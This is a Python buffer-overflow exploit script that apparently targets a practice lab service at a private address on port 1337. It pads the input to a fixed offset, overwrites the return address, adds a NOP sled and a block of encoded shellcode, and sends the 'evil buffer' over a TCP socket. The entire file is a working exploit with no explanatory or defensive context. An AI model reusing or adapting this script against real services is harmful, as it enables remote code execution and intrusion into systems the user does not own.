#!/usr/bin/env python3
import socket

ip = "10.10.80.211"
port = 1337

prefix = "OVERFLOW9 "
offset = 1514
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 20
payload = ("\xbb\xa6\x11\x9e\x9e\xdb\xd0\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x52\x31\x5d\x12\x03\x5d\x12\x83\x4b\xed\x7c\x6b\x6f"
"\xe6\x03\x94\x8f\xf7\x63\x1c\x6a\xc6\xa3\x7a\xff\x79\x14"
"\x08\xad\x75\xdf\x5c\x45\x0d\xad\x48\x6a\xa6\x18\xaf\x45"
"\x37\x30\x93\xc4\xbb\x4b\xc0\x26\x85\x83\x15\x27\xc2\xfe"
"\xd4\x75\x9b\x75\x4a\x69\xa8\xc0\x57\x02\xe2\xc5\xdf\xf7"
"\xb3\xe4\xce\xa6\xc8\xbe\xd0\x49\x1c\xcb\x58\x51\x41\xf6"
"\x13\xea\xb1\x8c\xa5\x3a\x88\x6d\x09\x03\x24\x9c\x53\x44"
"\x83\x7f\x26\xbc\xf7\x02\x31\x7b\x85\xd8\xb4\x9f\x2d\xaa"
"\x6f\x7b\xcf\x7f\xe9\x08\xc3\x34\x7d\x56\xc0\xcb\x52\xed"
"\xfc\x40\x55\x21\x75\x12\x72\xe5\xdd\xc0\x1b\xbc\xbb\xa7"
"\x24\xde\x63\x17\x81\x95\x8e\x4c\xb8\xf4\xc6\xa1\xf1\x06"
"\x17\xae\x82\x75\x25\x71\x39\x11\x05\xfa\xe7\xe6\x6a\xd1"
"\x50\x78\x95\xda\xa0\x51\x52\x8e\xf0\xc9\x73\xaf\x9a\x09"
"\x7b\x7a\x0c\x59\xd3\xd5\xed\x09\x93\x85\x85\x43\x1c\xf9"
"\xb6\x6c\xf6\x92\x5d\x97\x91\x96\xa7\x80\x60\xcf\xa5\xae"
"\x73\x53\x23\x48\x19\x7b\x65\xc3\xb6\xe2\x2c\x9f\x27\xea"
"\xfa\xda\x68\x60\x09\x1b\x26\x81\x64\x0f\xdf\x61\x33\x6d"
"\x76\x7d\xe9\x19\x14\xec\x76\xd9\x53\x0d\x21\x8e\x34\xe3"
"\x38\x5a\xa9\x5a\x93\x78\x30\x3a\xdc\x38\xef\xff\xe3\xc1"
"\x62\xbb\xc7\xd1\xba\x44\x4c\x85\x12\x13\x1a\x73\xd5\xcd"
"\xec\x2d\x8f\xa2\xa6\xb9\x56\x89\x78\xbf\x56\xc4\x0e\x5f"
"\xe6\xb1\x56\x60\xc7\x55\x5f\x19\x35\xc6\xa0\xf0\xfd\xe6"
"\x42\xd0\x0b\x8f\xda\xb1\xb1\xd2\xdc\x6c\xf5\xea\x5e\x84"
"\x86\x08\x7e\xed\x83\x55\x38\x1e\xfe\xc6\xad\x20\xad\xe7"
"\xe7")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
